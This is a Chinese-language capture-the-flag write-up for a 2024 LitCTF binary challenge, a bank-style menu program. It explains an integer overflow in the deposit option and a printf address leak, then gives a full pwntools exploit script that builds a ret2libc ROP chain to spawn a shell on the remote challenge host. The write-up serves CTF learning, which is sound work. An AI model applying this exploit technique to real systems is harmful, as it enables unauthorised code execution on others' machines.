### 2024 LitCTF

开了Full RELRO和NX 意味着如果存在格式化字符串我们无法修改got表地址进行跳转
![[Pasted image 20240923211859.png]]

查看主函数，第一个setup就是常规的缓冲区设置
![[Pasted image 20240923211911.png]]

这里有个函数，看到这我还以为是堆的菜单题，往下看就知道不是了
![[Pasted image 20240923211934.png]]

进app_fun()函数看看

![[Pasted image 20240923211948.png]]

![[Pasted image 20240923211958.png]]

第一个password后面的输入随便填就行，没什么用，往下看就是一个大循环，atoi函数就是将字符串转化为整数（int型），第一个case 1u:里面是输出目前nbytes的值，也就是库存，case 2u:是取钱，将你输入的数首先进行检查，防止限制外数的输入，然后将库存nbytes减去你输入的数，case 3u:是存钱，这个条件里面有漏洞，也就是整数溢出的漏洞，我们需要输入一个数，这个数是nptr是int型的，但是在下面有个强制转化：v5 = (unsigned int)nptr; 这里将int型转化为unsigned的类型，会造成溢出，变得非常大，效果如下：

![[Pasted image 20240923212042.png]]

发现库存nbytes变得非常的大。

看看有没有后门，很遗憾没有。只能我们自己去泄露了。

![[Pasted image 20240923212016.png]]

我们往下看看还有什么可以利用的，可以看到case 5u:这里面有个输出，你看看输出的是什么，不错，是printf的真实地址，这就我们解决了泄露的问题了，我们也就可以利用其来寻找libc的版本

![[Pasted image 20240923212029.png]]

并且在这里存在一个read函数，正好可以利用超级大的nbytes来溢出，那么到这里我们的问题已经解决了。

附上exp：仅供参考！！

```
from pwn import*
from LibcSearcher import*
context(terminal = ['tmux','split','-h'])
# p=process('./app')
p = remote('node1.anna.nssctf.cn',28423)
elf=ELF('./app')
context(os='linux', arch='amd64', log_level='debug')
#attach(p)
pop_rdi=0x0000000000401233
ret=0x00000000004014BA
p.recvuntil(b"password:")
# attach(p)
pay=b'passwd'
p.sendline(pay)
p.recvuntil(b"Exit")
pay=b'3'
p.send(pay)
p.recvuntil(b"Please enter your deposit:")
p.send(b"-1")

p.recvuntil(b"Exit")
pay=b'5'
p.sendline(pay)
p.recvuntil(b"gift:")
addr=int(p.recv(16),16)
print(hex(addr))

libc=LibcSearcher("printf",addr)
log.success('leak_atoi_real_addr => {}'.format(hex(addr)))
libcbase = addr - libc.dump('printf')
system_addr = libcbase + libc.dump('system')
str_bin_sh = libcbase + libc.dump('str_bin_sh')

log.success('leak_system_real_addr => {}'.format(hex(system_addr)))
log.success('leak_bin_sh_real_addr => {}'.format(hex(str_bin_sh)))

payload=flat(b'a'*0x168,ret,pop_rdi,str_bin_sh,system_addr)
p.sendline(payload)
p.sendline(b"4")

p.interactive()
```